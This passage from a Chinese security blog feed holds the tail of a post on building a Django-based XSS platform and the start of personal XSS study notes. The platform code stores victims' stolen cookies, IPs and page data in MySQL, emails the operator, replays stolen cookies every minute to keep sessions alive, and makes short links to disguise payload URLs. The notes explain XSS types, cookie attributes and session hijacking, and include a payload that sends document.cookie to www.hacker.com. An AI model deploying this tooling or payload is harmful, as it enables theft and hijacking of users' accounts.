requests.GET.get(&apos;keepsession&apos;,&apos;0&apos;).replace(&quot;&apos;&quot;,&quot;\&apos;&quot;)</span><br><span class="line">    list = [now_time,ip,origin,software,method,data,keep_alive]</span><br><span class="line">    put_mysql(list,url)</span><br><span class="line"></span><br><span class="line">def put_mysql(list,url):</span><br><span class="line">    db,cursor = connect()</span><br><span class="line">    name = get_info(url)</span><br><span class="line">    cursor.execute(&quot;Select user From projects Where url=&apos;&quot;+url+&quot;&apos;&quot;)</span><br><span class="line">    user = cursor.fetchone()[0]</span><br><span class="line">    m_query = &quot;INSERT INTO letters(time,name,ip,origin,software,method,data,user,keep_alive) VALUES(&apos;&#123;0&#125;&apos;,&apos;&#123;1&#125;&apos;,&apos;&#123;2&#125;&apos;,&apos;&#123;3&#125;&apos;,&apos;&#123;4&#125;&apos;,&apos;&#123;5&#125;&apos;,&apos;&#123;6&#125;&apos;,&apos;&#123;7&#125;&apos;,&apos;&#123;8&#125;&apos;)&quot;</span><br><span class="line">    m_query = m_query.format(list[0],name,list[1],list[2],list[3],list[4],list[5],user,list[6])</span><br><span class="line">    cursor.execute(m_query)</span><br><span class="line">    db.commit()</span><br><span class="line">    db.close()</span><br><span class="line"></span><br><span class="line">def get_letters(username):</span><br><span class="line">    db, cursor = connect()</span><br><span class="line">    m_query = &quot;SELECT * FROM letters WHERE user = &apos;&#123;&#125;&apos;&quot;</span><br><span class="line">    m_query = m_query.format(username)</span><br><span class="line">    cursor.execute(m_query)</span><br><span class="line">    result_list = cursor.fetchall()</span><br><span class="line">    return result_list</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160; &#160;既然我们知道了xss脚本会将信息构造通过GET的参数形式传给XSS平台，我们只需在服务器接受数据并保存即可。  </p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>&#160; &#160; &#160; &#160;我们可以为我们的平台编写新的功能以完善我们的平台，如邮件提醒，cookie活性保持等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">邮件发送</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">import smtplib</span><br><span class="line">from email.mime.text import MIMEText</span><br><span class="line">from email.utils import formataddr</span><br><span class="line"></span><br><span class="line">my_sender=&apos;xxxx&apos;</span><br><span class="line">my_pass = &apos;xxxx&apos;</span><br><span class="line"></span><br><span class="line">def send_mail(user_mail):</span><br><span class="line">    try:</span><br><span class="line">        print(user_mail)</span><br><span class="line">        msg=MIMEText(&apos;您点的外卖已送达，请登录平台查询&apos;,&apos;plain&apos;,&apos;utf-8&apos;)</span><br><span class="line">        msg[&apos;From&apos;]=formataddr([&quot;XSS平台&quot;,my_sender])</span><br><span class="line">        msg[&apos;To&apos;]=formataddr([&quot;顾客&quot;,user_mail])</span><br><span class="line">        msg[&apos;Subject&apos;]=&quot;您点的外卖已送达，请登录平台查询&quot;</span><br><span class="line">        server=smtplib.SMTP_SSL(&quot;smtp.qq.com&quot;, 465)</span><br><span class="line">        server.login(my_sender, my_pass)</span><br><span class="line">        server.sendmail(my_sender,[user_mail,],msg.as_string())</span><br><span class="line">        server.quit()</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;</span><br><span class="line">使用独立于主线程的其他线程</span><br><span class="line">来保持通用项目的cookie信息&apos;活性&apos;</span><br><span class="line">默认保持一个小时的活性</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">import requests,queue,time,pymysql</span><br><span class="line"></span><br><span class="line">Cookie_Time = 1</span><br><span class="line"></span><br><span class="line">def decrease(time,number):</span><br><span class="line">    if time &lt; number:</span><br><span class="line">        time = &apos;0&apos;+str(time)</span><br><span class="line">    else:</span><br><span class="line">        time = str(time)</span><br><span class="line">    return time</span><br><span class="line"></span><br><span class="line">def count_time(now_time):</span><br><span class="line">    global Cookie_Time</span><br><span class="line">    year = int(now_time[0:2])</span><br><span class="line">    month = int(now_time[3:5])</span><br><span class="line">    day = int(now_time[6:8])</span><br><span class="line">    hours = int(now_time[9:11])</span><br><span class="line">    if hours &lt; Cookie_Time:</span><br><span class="line">        if day == 1:</span><br><span class="line">            if month == 1:</span><br><span class="line">                month=12</span><br><span class="line">                year -= 1</span><br><span class="line">            else:</span><br><span class="line">                day=30</span><br><span class="line">                month -= 1</span><br><span class="line">        else:</span><br><span class="line">            day -= 1</span><br><span class="line">            hours += 19</span><br><span class="line">    else:</span><br><span class="line">        hours -= 5</span><br><span class="line">    hours = decrease(hours,10)</span><br><span class="line">    day = decrease(day,10)</span><br><span class="line">    month = decrease(month,10)</span><br><span class="line">    year = decrease(year,10)</span><br><span class="line">    dec_time = (&quot;&#123;0&#125;-&#123;1&#125;-&#123;2&#125; &#123;3&#125;&quot;).format(year,month,day,hours) + now_time[11:]</span><br><span class="line">    return dec_time</span><br><span class="line"></span><br><span class="line">def create_queue():</span><br><span class="line">    Cookie_queue = queue.Queue()</span><br><span class="line">    now_time = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;, time.localtime(time.time()))[2:]</span><br><span class="line">    dec_time = count_time(now_time)</span><br><span class="line">    m_query = (&quot;SELECT software,origin,data FROM letters WHERE name=&apos;default&apos; and time&gt;&apos;&#123;&#125;&apos; and keep_alive = &apos;1&apos;&quot;).format(dec_time)</span><br><span class="line">    db = pymysql.connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;,&apos;xss&apos;)</span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    cursor.execute(m_query)</span><br><span class="line">    return_list = cursor.fetchall()</span><br><span class="line">    for x in return_list:</span><br><span class="line">        Cookie_queue.put(x)</span><br><span class="line">    return Cookie_queue</span><br><span class="line"></span><br><span class="line">def action():</span><br><span class="line">    while True:</span><br><span class="line">        time.sleep(60)</span><br><span class="line">        task_queue = create_queue()</span><br><span class="line">        while not task_queue.empty():</span><br><span class="line">            tasks = task_queue.get()</span><br><span class="line">            url = tasks[1]</span><br><span class="line">            ua = tasks[0]</span><br><span class="line">            cookie = tasks[2]</span><br><span class="line">            headers = &#123;&apos;User-Agent&apos;: ua, &apos;Cookie&apos;: cookie&#125;</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url, headers=headers)</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160; &#160;注意这里需要使用独立于django主线程的子线程，比如我在manager.py里添加了这么一段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">from xssplatform.keep_alive import action</span><br><span class="line"></span><br><span class="line">class keep_Thread(threading.Thread):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(keep_Thread,self).__init__()</span><br><span class="line">    def run(self):</span><br><span class="line">        action()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    th = keep_Thread()</span><br><span class="line">    th.start()</span><br></pre></td></tr></table></figure></p><p>短链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;</span><br><span class="line">短链接生成</span><br><span class="line">接口c7.gg</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">import requests,json</span><br><span class="line"></span><br><span class="line">Headers = &#123;</span><br><span class="line">    &quot;accept&quot; : &quot;application/json, text/javascript, */*; q=0.01&quot;,</span><br><span class="line">    &quot;accept-encoding&quot; : &quot;gzip, deflate, br&quot;,</span><br><span class="line">    &quot;accept-language&quot; : &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;,</span><br><span class="line">    &quot;content-length&quot; : &quot;53&quot;,</span><br><span class="line">    &quot;content-type&quot; : &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,</span><br><span class="line">    &quot;origin&quot; : &quot;https://www.985.so&quot;,</span><br><span class="line">    &quot;referer&quot; : &quot;https://www.985.so/&quot;,</span><br><span class="line">    &quot;user-agent&quot; : &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def url_to_short(url):</span><br><span class="line">    global Headers</span><br><span class="line">    data = &#123;&apos;type&apos;:&apos;c7&apos;,&apos;url&apos;:url&#125;</span><br><span class="line">    r = requests.post(&apos;https://create.ft12.com/done.php?m=index&amp;a=urlCreate&apos;,data=data,headers=Headers)</span><br><span class="line">    list = json.loads(r.text)</span><br><span class="line">    return list[&apos;list&apos;]</span><br></pre></td></tr></table></figure></p><h1 id="4-最后"><a href="#4-最后" class="headerlink" title="4) 最后"></a>4) 最后</h1><p>&#160; &#160; &#160; &#160;其实看起来高大上的XSS平台原理就那么简单，真正难的部分是关于XSS跨站脚本的编写。<br>&#160; &#160; &#160; &#160;此项目已开源于<a href="https://github.com/HackerYunen/django-xss-platform" target="_blank" rel="noopener">Github</a>，有任何问题可以提交issue，我会在第一时间进行回复。<br>&#160; &#160; &#160; &#160;我不会不断更新此项目，感兴趣的朋友可以多多关注我的<a href="http://www.0x002.com">博客</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-简要描述&quot;&gt;&lt;a href=&quot;#1-简要描述&quot; class=&quot;headerlink&quot; title=&quot;1) 简要描述&quot;&gt;&lt;/a&gt;1) 简要描述&lt;/h1&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160; &amp;#160;原理十分简单2333,代码呆萌,大牛勿喷 &amp;gt;_&amp;lt;&lt;br&gt;
    
    </summary>
    
      <category term="原创栏目" scheme="http://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="XSS" scheme="http://www.0x002.com/tags/XSS/"/>
    
      <category term="Django" scheme="http://www.0x002.com/tags/Django/"/>
    
      <category term="工具" scheme="http://www.0x002.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>前端Hack之XSS攻击个人学习笔记</title>
    <link href="http://www.0x002.com/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.0x002.com/2019/前端Hack之XSS攻击个人学习笔记/</id>
    <published>2019-03-09T08:02:35.000Z</published>
    <updated>2019-03-10T08:34:28.891Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简单概述"><a href="#简单概述" class="headerlink" title="简单概述"></a>简单概述</h1><p><strong><br>&#160; &#160; &#160; &#160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com)</strong><br><a id="more"></a></p><h2 id="1-什么是XSS"><a href="#1-什么是XSS" class="headerlink" title="1) 什么是XSS?"></a>1) 什么是XSS?</h2><p><strong><br>&#160; &#160; &#160; &#160;XSS(Cross-Site Script,跨站脚本)是由于web应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击。</strong><br>&#160; &#160; &#160; &#160;如果对以上描述还不是很了解的话，可以参考<a href="https://baike.baidu.com/item/xss/917356" target="_blank" rel="noopener">百度百科</a><br>&#160; &#160; &#160; &#160;在<strong>余弦大大</strong>和<strong>xisigr大大</strong>的书籍《Web前端安全技术揭秘》第三章中这样说道：</p><blockquote><p>跨站脚本的重点不在“跨站”上，而应该在“脚本”上…因为这个“跨”实际上属于浏览器的特性，而不是缺陷，造成“跨”的假象是因为绝大多数的XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源。</p></blockquote><p>&#160; &#160; &#160; &#160;确实，当攻击者的服务器上的js嵌入到受害者的页面，至于接下来的攻击就是关于“脚本”的事了。</p><h2 id="2-XSS可以带来哪些危害？"><a href="#2-XSS可以带来哪些危害？" class="headerlink" title="2) XSS可以带来哪些危害？"></a>2) XSS可以带来哪些危害？</h2><p>&#160; &#160; &#160; &#160;对于XSS攻击的危害，大多数的人们却没有正确的认识，实际上攻击者可以利用XSS攻击造成巨大的危害。比如：</p><ul><li>网页挂马;</li><li>盗取Cookie;</li><li>DoS攻击;</li><li>钓鱼攻击;</li><li>蠕虫攻击;</li><li>劫持用户web行为;</li><li>结合CSRF进行针对性攻击;</li><li>······</li></ul><p>这些都是可以利用XSS漏洞来达成的。</p><h2 id="3-XSS类型"><a href="#3-XSS类型" class="headerlink" title="3) XSS类型"></a>3) XSS类型</h2><p>目前的XSS总共可以分为三种类型：</p><ul><li><strong>反射型(也叫非持久型)</strong></li><li><strong>存储型(也叫持久型)</strong></li><li><strong>DOM型</strong></li></ul><p>PS：前两种XSS都会与服务器产生交互，后一种不会产生交互。(某安全大佬面试)</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><strong><br>&#160; &#160; &#160; &#160;反射型XSS，也称非持久型XSS，最常见也是使用最广的一种。在反射型XSS中，payload一般存在于网页的Url中，只用户单击时触发，只执行一次，非持久化，故称反射型XSS。攻击者发送恶意Url链接让受害者点击(一般会对payload部分进行处理，如：编码转换和短域名跳转)</strong><br>&#160; &#160; &#160; &#160;由于篇幅问题，关于反射型XSS我就不做过多简述。<br>&#160; &#160; &#160; &#160;有的人认为反射型XSS需要用户已经登陆的情况下才能利用，其实不然。我们可以通过反射型xss让浏览器远程嵌入我们的js文件，然后配合浏览器漏洞进行RCE攻击。这里给出个相近的例子：<a href="https://xz.aliyun.com/t/3919" target="_blank" rel="noopener">记一次从DOM型XSS到RCE过程</a>。  </p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>&#160; &#160; &#160; &#160;<strong>存储型XSS，也称持久型XSS，攻击者首先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意javascript页面就会执行恶意代码，不需要用户点击特定Url就能执行，故存储型XSS比反射型XSS更具威胁性。— 《XSS跨站脚本攻击剖析与防御》</strong><br>&#160; &#160; &#160; &#160;存储型XSS与反射型XSS最大的区别就在于提交的XSS代码会储存于服务端，下次再访问目标页面时不用再提交XSS代码。—《Web前端黑客技术揭秘》</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>&#160; &#160; &#160; &#160;<strong>许多朋友对反射型XSS和存储型XSS都比较清楚，可是却不太了解什么是DOM型XSS，没关系，看完这里你就应该会对DOM型XSS有个大概认识<br>&#160; &#160; &#160; &#160;DOM,即Document Object Model(文件对象模型)的缩写，关于DOM的概念想了解的朋友可以在<a href="https://baike.baidu.com/item/DOM/50288" target="_blank" rel="noopener">百度百科</a>得到相应的解答。</strong><br>&#160; &#160; &#160; &#160;DOM型XSS是如何产生的？我们知道，客户端javascipt是可以访问浏览器的DOM文本对象模型，如果没有经过适当的过滤和消毒，那么应用程序可能会受到基于DOM的XSS攻击。<br>&#160; &#160; &#160; &#160;在<strong>刺</strong>的《白帽子讲Web安全》是这样讲的：</p><blockquote><p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS，也就是DOM型XSS。</p></blockquote><p>&#160; &#160; &#160; &#160;举个简单的例子(来自《Web前端黑客技术揭秘》)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">...</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var a=document.URL;</span><br><span class="line">document.write(a.substring(a.indexOf(&quot;a=&quot;)+2,a.length));</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>&#160; &#160; &#160; &#160;把以上代码保存为1.html,然后打开浏览器访问<code>http://127.0.0.1/1.html#a=test</code><br>&#160; &#160; &#160; &#160;我们知道这是个静态页面，而且#后边的内容并不会传给服务器。<br><img src="https://i.loli.net/2019/03/09/5c839d5c04d33.png" alt="访问结果"><br>&#160; &#160; &#160; &#160;可是这样就不会产生XSS漏洞了吗？如果我们访问<br><code>http://127.0.0.1/.html#a=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>&#160; &#160; &#160; &#160;当我们访问上述url时，服务器会返回源代码，我们可以用抓包工具截取，发现与正常访问的页面无差别，可是当浏览器收到源代码时便把HTML文本解析成DOM对象并执行，结果弹出/xss/消息框，感兴趣的朋友可以试试。<br>&#160; &#160; &#160; &#160;具体执行过程如图：<img src="https://i.loli.net/2019/03/09/5c83cca814d51.jpg" alt="来自《黑客攻防技术宝典Web实战篇》"></p><h2 id="4-XSS的利用方式"><a href="#4-XSS的利用方式" class="headerlink" title="4) XSS的利用方式"></a>4) XSS的利用方式</h2><p>&#160; &#160; &#160; &#160;前面我们介绍了各种XSS的特点及产生方式，现在我们来说说如何利用这些漏洞。</p><h3 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h3><p><strong>&#160; &#160; &#160; &#160;Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。如：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>会弹出当前页面的cookie信息。</strong>  </p><hr><p>&#160; &#160; &#160; &#160;这里我们引入一个叫做“同源策略”的概念：</p><blockquote><p>首先，同“源”的源不单单是指两个页面的主域名，还包括这两个域名的协议、端口号和子级域名相同。举个例子，假设我现在有一个页面<code>http://www.a.com/index.html</code>，域名是 <code>www.a.com</code>，二级域名为 www,协议是 http，端口号是默认的 80，这个页面的同源情况如下：<img src="https://i.loli.net/2019/03/10/5c84907479e30.jpg" alt=""><br>&#160; &#160; &#160; &#160;同源策略存在的意义就是为了保护用户的信息的安全。一般网站都会把关于用户的一些敏感信息存在浏览器的 cookie 当中试想一下，如果没有同源策略的保护，那么 b 页面也可以随意读取 a 页面存储在用户浏览器 cookie 中的敏感信息，就会造成信息泄露。如果用户的登录状态被恶意网站能够随意读取，那后果不堪设想。由此可见，同源策略是非常必要的，可以说是浏览器安全的基石。<br>&#160; &#160; &#160; &#160;除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制：<br>&#160; &#160; &#160; &#160;(1) 无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB<br>&#160; &#160; &#160; &#160;(2) 无法读写非同源网页的 DOM<br>&#160; &#160; &#160; &#160;(3) 无法向非同源地址发送 AJAX请求（可以发送，但浏览器会拒绝响应而报错）</p></blockquote><p>&#160; &#160; &#160; &#160;————引自<strong>晚风</strong>表哥在信安之路上的投稿文章<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247487543&amp;idx=1&amp;sn=924a5d5f37fa27d053187cf6a740ba8e&amp;chksm=ec1e201fdb69a909bda97b7e5af3aaffb2853a95694310d2463fe139468b96a55cf7e25edc6c&amp;mpshare=1&amp;scene=23&amp;srcid=#rd" target="_blank" rel="noopener">《同源策略与跨域请求》</a>  </p><hr><p>&#160; &#160; &#160; &#160;我们知道Cookie有如下常见的属性：</p><ul><li>Domain————设置关联Cookie的域名;</li><li>Expires————通过给定一个过期时间来创建一个持久化Cookie;</li><li>Httponly————用于避免Cookie被Javascript访问;</li><li>Name————Cookie的名称;</li><li>Path————关联到Cookie的路径，默认为/;</li><li>Value————读写Cookie的值;</li><li>Secure————用于指定Cookie需要通过安全Socket层传递连接;  </li></ul><p>&#160; &#160; &#160; &#160;并且Cookie也可以安装类型分为：</p><ul><li>本地Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在;</li><li>内存Cookie————即储存在内存中，随浏览器的关闭而消失;  </li></ul><p>&#160; &#160; &#160; &#160;如何区分两者很简单，只要判断cookie中的expires即过期时间属性有没有设置，如果设置了即为本地cookie，反之为内存cookie。<br>&#160; &#160; &#160; &#160;由于Cookie具有的不同属性，我们可以将不同属性的Cookie盗取方式分为以下几种情况</p><h4 id="默认"><a href="#默认" class="headerlink" title="默认"></a>默认</h4><p>&#160; &#160; &#160; &#160;默认情况，即不对Cookie的任何属性进行指定就设置Cookie的情况。这种情况下Cookie的获取最为简单。可以通过下列方式获取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">new Image().src=&quot;http://www.hacker.com/cookie.php?cookie=&quot;+document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h4 id="不同域"><a href="#不同域" class="headerlink" title="不同域"></a>不同域</h4><p>&#160; &#160; &#160; &#160;这是由于domain字段的机制导致的。一个Cookie如果不知道domain的值，则默认为<strong>本域</strong>。<br>&#160; &#160; &#160; &#160;例如有两个网站<code>www.a.com</code>和<code>test.a.com</code>且后者存在xss漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从<code>test.a.com</code>获取到<code>www.a.com</code>的Cookie，可是如果<code>www.a.com</code>的Cookie值中的domain属性设置为父级域即<code>a.com</code>，就可以通过<code>test.a.com</code>的xss漏洞获取到<code>www.a.com</code>的Cookie值。</p><h4 id="不同路径"><a href="#不同路径" class="headerlink" title="不同路径"></a>不同路径</h4><p>&#160; &#160; &#160; &#160;这是由于path字段的机制导致的。在设置Cookie时，如果不指定path的值，默认就是目标页面的路径。比如在<code>www.a.com/admin/index.php</code>设置cookie值且不知道path，那么path默认为<code>/admin/</code>。javascript可以指定任意路径的cookie，但是只有对于path值的目录下才能读取Cookie,即上述例子中只有<code>/admin/</code>目录下的javascipt才能读取前边设置的Cookie。</p><h4 id="Http-Only"><a href="#Http-Only" class="headerlink" title="Http Only"></a>Http Only</h4><p>&#160; &#160; &#160; &#160;HttpOnly是指仅在Http层面上传输的Cookie，当设置了HttpOnly标志后，客户端脚本就无法读取该Cookie，这样做能有效防御XSS攻击获取Cookie，也是目前防御XSS的主流手段之一。不过利用某些特定方式也可以同样读取到标志了HttpOnly的Cookie。  </p><ul><li>利用调试信息，如：PHP的phpinfo()和Django的调试信息，里边都记录了Cookie的值，且标志了HttpOnly的Cookie也同样可以获取到。</li><li>利用Apache Http Server 400错误暴露HttpOnly Cookie的特点。  </li></ul><p>感兴趣的朋友可以查阅相关资料(《Web前端黑客技术揭秘》p36-39)</p><h4 id="Secure"><a href="#Secure" class="headerlink" title="Secure"></a>Secure</h4><p>&#160; &#160; &#160; &#160;Secure是指设置了Secure的Cookie尽在HTTPS层面上进行安全传输，如果请求是HTTP的，则不会带上改Cookie，这样做的好处是可以降低Cookie对中间人攻击获取的风险，不过对我们此处讨论的XSS攻击无拦截效果，可通过默认情况下获取。</p><h4 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h4><p>&#160; &#160; &#160; &#160;HTTP响应头的P3P字段可以用于标识是否允许目标网站的Cookie被另一域通过加载目标网站而设置或发送，据说仅IE支持（17年）。<br>&#160; &#160; &#160; &#160;我们来举个例子，在A域通过iframe等方式加载B域(此时也称B域为第三方域)，如果我们想通过B域来设置A域的Cookie，或加载B域时带上B域的Cookie，这时就得涉及到P3P。</p><h5 id="B域设置A域Cookie"><a href="#B域设置A域Cookie" class="headerlink" title="B域设置A域Cookie"></a>B域设置A域Cookie</h5><p>&#160; &#160; &#160; &#160;在IE下默认是不允许第三方域设置的的，除非A域在响应头带上P3P字段。当响应头头带上P3P后，IE下第三方域即可进行对A域Cookie的设置，且设置的Cookie会带上P3P属性，一次生效，即使之后没有P3P头也有效。</p><h5 id="加载B域时Cookie传入问题"><a href="#加载B域时Cookie传入问题" class="headerlink" title="加载B域时Cookie传入问题"></a>加载B域时Cookie传入问题</h5><p>&#160; &#160; &#160; &#160;我们知道Cookie分为内存Cookie和本地Cookie，当我们通过A域加载B域时，默认是带内存Cookie加载(如果无内存Cookie则不带)，而如果想要带本地Cookie加载，则本地Cookie必须带P3P属性。  </p><ul><li>相关文章：<a href="https://www.cnblogs.com/cheney256/articles/8942240.html" target="_blank" rel="noopener">用P3P header解决iframe跨域访问cookie</a>  </li><li>相关阅读：<strong>《Web前端黑客技术揭秘》p41-42</strong>  </li></ul><h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>&#160; &#160; &#160; &#160;由于Cookie的不安全性，开发者们开始使用一些更为安全的认证方式——Session。<br>&#160; &#160; &#160; &#160;这里引用《XSS跨站脚本攻击剖析与防御》p51-52页的内容</p><blockquote><p>&#160; &#160; &#160; &#160;Session的中文意思是会话，其实就是访问者从到达特定主页到离开的那段时间，在这个过程中，每个访问者都会得到一个单独的Session。Session是给予访问的进程，记录了一个访问的开始到结束，搭档浏览器或进程关闭之后，Session也就“消失”了。<br>&#160; &#160; &#160; &#160;在Session机制中，客户端和服务端也有被其他人利用的可能。<br>&#160; &#160; &#160; &#160;Session和Cookie最大的区别在于：Session是保存在服务端的内存里面，而Cookie保存于浏览器或客户端文件里面</p></blockquote><p>&#160; &#160; &#160; &#160;这里提到Session是因为我们在现实情况中可能会出现已经获取到了Cookie，但是由于用户已经退出了浏览器指示Session无效，导致我们无法通过Cookie欺骗来获取用户权限；又比如有的网站设置了HttpOnly，获取不到Cookie；再者有的网站将Cookie与客户端IP向绑定；此时我们便可以利用会话劫持来达到目的。<br>&#160; &#160; &#160; &#160;会话劫持的实质就是模拟GET/POST请求(带Cookie)通过受害者浏览器发送给服务器，我们可以通过下面的方式来完成。  </p><ul><li><p>通过javascript控制DOM对象来发起一个GET请求，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var img = document.creatElement(&quot;img&quot;);</span><br><span class="line">img.src = &quot;http://www.a.com/del.php?id=1&quot;;</span><br><span 